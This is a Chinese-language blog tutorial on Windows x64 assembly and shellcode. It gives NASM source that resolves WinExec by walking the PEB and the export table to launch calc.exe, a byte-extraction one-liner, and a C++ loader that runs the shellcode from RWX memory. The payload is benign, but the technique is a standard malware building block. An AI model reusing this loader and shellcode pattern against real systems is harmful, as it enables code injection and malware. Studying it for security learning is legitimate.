---
title: Windows x64汇编和Shellcode
url: https://mp.weixin.qq.com/s/oAH6d96AGVnw75Ht-w0Onw
source: Doonsec's feed
date: 2026-03-23
fetch_date: 2026-03-24T04:12:35.870658
---

# Windows x64汇编和Shellcode

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/5FtPcWDnic0fhhtq9jhpicOU7iaxBA16xVG2xv7ZSCcCdXKibM1N9DO1Chv7aZrpo2cMvdxEfK8zUMtFq9g2BQRIleHS4Glib0Ziblc0yjKnx0Qrc/0?wx_fmt=jpeg)

# Windows x64汇编和Shellcode

原创

ybdt
ybdt

卡卡罗特取西经

![]()

在小说阅读器中沉浸阅读

01 前言

之前那篇“Windows x64汇编”忘记写Shellcode部分，想修改一下，结果微信公众号修改文章限制每次只能改几个字符，干脆重写一篇吧

02 Windows x64汇编

学完王爽老师的Windows 16位汇编、罗云彬老师的Windows 32位汇编，最后就是Windows x64汇编，下面这个系列是我觉得不错的学习资源

```
【x64汇编与shellcode入门教程 01】https://mp.weixin.qq.com/s/HzEWKEpYpeBNJyk4IEll2g?scene=1【x64汇编与shellcode入门教程 02】https://mp.weixin.qq.com/s/vEfsmgBpEOJSzvXcvnEtUA?scene=1【x64汇编与shellcode入门教程 03】https://mp.weixin.qq.com/s/bJnqwt0_9rQCmaYZFrcFKg?scene=1【x64汇编与shellcode入门教程 04】https://mp.weixin.qq.com/s/-SEK85Fflt-Gr_Km9YcD3w?scene=1【x64汇编与shellcode入门教程 05】https://mp.weixin.qq.com/s/xC02bij37DTr_j4arJi_ag?scene=1【x64汇编与shellcode入门教程 06】https://mp.weixin.qq.com/s/db2pQXBx44IF4Dst0hw9sQ?scene=1【x64汇编与shellcode入门教程 07】https://mp.weixin.qq.com/s/AmjTv9wzFqzV1GKZYUecNQ
```

原文在这里：https://g3tsyst3m.com/shellcoding/assembly/debugging/x64-Assembly-and-Shellcoding-101/

翻译的质量不错，都很准确，当然你想看原文也可以

基本原理：通过GS段寄存器获取TEB基址，遍历PEB模块链表获取kernel32.dll基址，遍历kernel32.dll导出表获取WinExec地址，最后通过WinExec执行calc.exe

![](https://mmbiz.qpic.cn/mmbiz_png/5FtPcWDnic0cRZY0gVwTd8NQa06ub1FtAmdbC9cJKIymMT8taCHDUV4XthfKlNXGuJuHKKhHhSKPXu8peTRwvFbjrUBz9XnavkSD7Gic6ZFD4/640?wx_fmt=png&from=appmsg)

代码如下，代码中每条指令都包含了详细注释，我就不再赘述解释了

```
; nasm -fwin64 x64findkernel32.asm; ld -m i386pep -o x64findkernel32.exe x64findkernel32.objBITS 64SECTION .textglobal mainmain:; get the base address of kernel32.dll by gs segment registersub rsp, 0x28and rsp, 0xfffffffffffffff0xor rcx, rcx                      ; rcx = 0   mov rax, [gs:rcx + 0x60]          ; gs contain the base address of TEB, and offset 0x60 is the base address of PEBmov rax, [rax + 0x18]             ; offset 0x18 is the base address of PEB->Ldrmov rsi, [rax + 0x10]             ; offset 0x10 is the base address of PEB->Ldr->InLoadOrderModuleListmov rsi, [rsi]                    ; jump to next node of linked list PEB->Ldr->InLoadOrderModuleList, ntdll.dllmov rsi, [rsi]                    ; jump to next node of linked list  PEB->Ldr->InLoadOrderModuleList, kernel32.dllmov rbx, [rsi + 0x30]             ; offset 0x30 is the base address of kernel32.dllmov r8, rbx                       ; the value of rbx assign to r8; parse pe file header and export table to locate WinExec addressmov ebx, [rbx+0x3C]               ; pe file offset 0x3c contains nt headers addressadd rbx, r8                       ; relative address + base addressmov edx, [rbx+0x88]               ; nt headers offset 0x88 contains export directory addressadd rdx, r8                       ; relative address + base addressmov r10d, [rdx+0x14]              ; Total count for number of functionsxor r11, r11                      ; clear R11 mov r11d, [rdx+0x20]              ; AddressOfNames = RVAadd r11, r8                       ; AddressOfNames = VMAmov rcx, r10                      ; setup loop countermov rax, 0x00636578456E6957       ; "WinExec" string NULL terminated with a '0' push rax                          ; push to the stackmov rax, rsp                      ; move stack pointer to our WinExec string into RAXadd rsp, 8                        ; keep with 16 byte stack alignmentkernel32findfunction:    jecxz FunctionNameNotFound    ; If ecx is zero (function not found), set breakpoint    xor ebx, ebx                  ; Zero EBX    mov ebx, [r11+rcx*4]          ; EBX = RVA for first AddressOfName    add rbx, r8                   ; RBX = Function name VMA / add kernel32 base address to RVA to get WinApi name    dec rcx                       ; Decrement our loop by one, this goes from Z to A    mov r9, qword [rax]           ; R9 = "WinExec"    cmp [rbx], r9                 ; Compare all bytes    jz FunctionNameFound          ; jump if zero flag is set (found function name!)    jnz kernel32findfunction      ; didn't find the name, so keep loopin til we do!FunctionNameFound:    push rcx    jmp OrdinalLookupSetupFunctionNameNotFound:    int3OrdinalLookupSetup:    pop r15    js OrdinalLookupOrdinalLookup:    mov rcx, r15                  ; move our function's place into RCX    xor r11, r11                  ; clear R11 for use    mov r11d, [rdx+0x24]          ; AddressOfNameOrdinals = RVA    add r11, r8                   ; AddressOfNameOrdinals = VMA    inc rcx    mov r13w, [r11+rcx*2]         ; AddressOfNameOrdinals + Counter. RCX = counter    xor r11, r11    mov r11d, [rdx+0x1c]          ; AddressOfFunctions = RVA    add r11, r8                   ; AddressOfFunctions VMA in R11. Kernel32+RVA for function addresses    mov eax, [r11+r13*4]          ; function RVA.    add rax, r8                   ; Found the WinExec Api address!!!    push rax                      ; Store function addresses by pushing it temporarily    js executeit; call WinExecexecuteit:pop r15                           ; address for WinExecmov rax, 0x00                     ; push null string terminator '0'push rax                          ; push it onto the stackmov rax, 0x6578652E636C6163       ; move string 'calc.exe' into RAX push rax                          ; push string + null terminator to stackmov rcx, rsp                      ; RDX points to stack pointer "WinExec" (1st parameter))mov rdx, 1                        ; move 1 (show window parameter) into RDX (2nd parameter)sub rsp, 0x30                     ; align stack 16 bytes and allow for proper setup for shadow space demandscall r15                          ; Call WinExec!!
```

03 Windows x64汇编到Shellcode

使用objdump可以获取x64findkernel32.obj中的汇编

![](https://mmbiz.qpic.cn/mmbiz_png/5FtPcWDnic0cbxghNPj6c4XR2z3D0gWc6ibV28ibqOWkVicyTxSE1uFl5QBZhcjSHjkg9ncJcU6rNYibWq9avuLawPjTYIqOoLJV124hro3CToLM/640?wx_fmt=png&from=appmsg)

这些汇编指令对应的机器码其实就是shellcode，使用如下指令将它提取出来

```
for i in $(objdump -D x64findkernel32.obj | grep "^ " | cut -f2); do echo -n "\x$i" ; done
```

![](https://mmbiz.qpic.cn/mmbiz_png/5FtPcWDnic0eDn8RxPeyvGBQRibJZcR1TZP0ESa3meYSEibmY8DibicC51uoGN7tvqjXCicV3ic7pxDYD9iaOwBehN4EgChagdGg0lhmx10YicLpV3G4/640?wx_fmt=png&from=appmsg)

上述汇编中不涉及硬编码的函数地址或变量地址，所以它是一段PIC（Position Independent Code，位置无关代码）的shellcode，可以直接放到loader中执行，下面是一个简易的shellcode loader，代码很简单我就不解释了

```
#include <windows.h>#include <iostream>unsigned char shellcode[] ="\x48\x83\xec\x28\x48\x83\xe4\xf0\x48\x31\xc9\x65\x48\x8b\x41\x60\x48\x8b\x40\x18\x48\x8b\x70\x10\x48\x8b""\x36\x48\x8b\x36\x48\x8b\x5e\x30\x49\x89\xd8\x8b\x5b\x3c\x4c\x01\xc3\x8b\x93\x88\x00\x00\x00\x4c\x01""\xc2\x44\x8b\x52\x14\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4c\x89\xd1\x48\xb8\x57\x69\x6e\x45\x78\x65""\x63\x00\x50\x48\x89\xe0\x48\x83\xc4\x08\x67\xe3\x19\x31\xdb\x41\x8b\x1c\x8b\x4c\x01\xc3\x48\xff\xc9\x4c""\x8b\x08\x4c\x39\x0b\x74\x02\x75\xe7\x51\xeb\x01\xcc\x41\x5f\x78\x00\x4c\x89\xf9\x4d\x31\xdb\x44\x8b\x5a""\x24\x4d\x01\xc3\x48\xff\xc1\x66\x45\x8b\x2c\x4b\x4d\x31\xdb\x44\x8b\x5a\x1c\x4d\x01\xc3\x43\x8b\x04\xab""\x4c\x01\xc0\x50\x78\x00\x41\x5f\xb8\x00\x00\x00\x00\x50\x48\xb8\x63\x61\x6c\x63\x2e\x65\x78\x65\x50\x48""\x89\xe1\xba\x01\x00\x00\x00\x48\x83\xec\x30\x41\xff\xd7";int main() {    // 注意标志位PAGE_EXECUTE_READWRITE，给这段空间的数据设置为具有读写和可执行权限    void* exec_mem = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    if (exec_mem == nullptr) {        std::cerr << "Memory allocation failed\n";        return -1;    }    memcpy(exec_mem, shellcode, sizeof(shellcode));    auto shellcode_func = reinterpret_cast<void(*)()>(exec_mem);    shellcode_func();    VirtualFree(exec_mem, 0, MEM_RELEASE);    return 0;}
```

可以成功执行

![](https://mmbiz.qpic.cn/sz_mmbiz_png/5FtPcWDnic0dYYj70MoDAgBC232LEziaH9XmyblaHg8L8VkcNRT21XlsQkO0PgYJiaHoqYeRHD4u3D65aia90e38CC0JicOARpQw2UAibJy8hR7BE/640?wx_fmt=png&from=appmsg)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/6GUJytibkzlaPC9BibnGbtkOsLB2JpGBK0ytS84MUWncFTBYPicJMyRtju9EhxEYo92iaBPicxzdbK9t7aDWUB5dhKA/0?wx_fmt=png)

...